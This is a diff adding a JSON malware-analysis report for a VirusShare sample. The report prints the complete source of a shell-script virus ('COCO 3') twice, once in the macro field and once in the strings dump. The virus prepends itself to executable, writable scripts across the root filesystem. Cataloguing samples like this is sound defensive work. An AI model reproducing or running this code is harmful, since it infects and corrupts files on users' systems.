@@ -1,0 +1,53 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": " # COCO 3\n xtemp=$pwd\n head -n 22 $0 > /.test\n for dir in /* ; do\n  if test -d $dir ; then\n   cd $dir\n   for file in * ; do\n    if test -f $file && test -x $file && test -w $file ; then\n     if grep -s echo $file > /dev/nul ; then\n       head -n 1 $file > .mm\n       if grep -s COCO .mm > /dev/nul ; then\n        rm .mm -f ; else\n         cat $file > /.SAVEE\n         cat /.test > $file\n         cat /.SAVEE >> $file\n    fi; fi; fi\n   done\n   cd ..\n  fi\n done\n cd $xtemp\n rm /.test /.SAVEE .mm -f"
+    },
+    "filename": "VirusShare_124c4647262cbb64646caa61fec7ca5e",
+    "filesize": 519,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "124c4647262cbb64646caa61fec7ca5e",
+        "sha1": "7066e319d153b81348b2b8cfbe81c3620c3f35a5",
+        "sha256": "0a6422488ce62a31582cce2228df8d40b523575903316bf1014ff5b665eb4b22"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            " # COCO 3",
+            " xtemp=$pwd",
+            " head -n 22 $0 > /.test",
+            " for dir in /* ; do",
+            "  if test -d $dir ; then",
+            "   cd $dir",
+            "   for file in * ; do",
+            "    if test -f $file && test -x $file && test -w $file ; then",
+            "     if grep -s echo $file > /dev/nul ; then",
+            "       head -n 1 $file > .mm",
+            "       if grep -s COCO .mm > /dev/nul ; then",
+            "        rm .mm -f ; else",
+            "         cat $file > /.SAVEE",
+            "         cat /.test > $file",
+            "         cat /.SAVEE >> $file",
+            "    fi; fi; fi",
+            "   done",
+            "   cd ..",
+            "  fi",
+            " done",
+            " cd $xtemp",
+            " rm /.test /.SAVEE .mm -f"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.277698",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
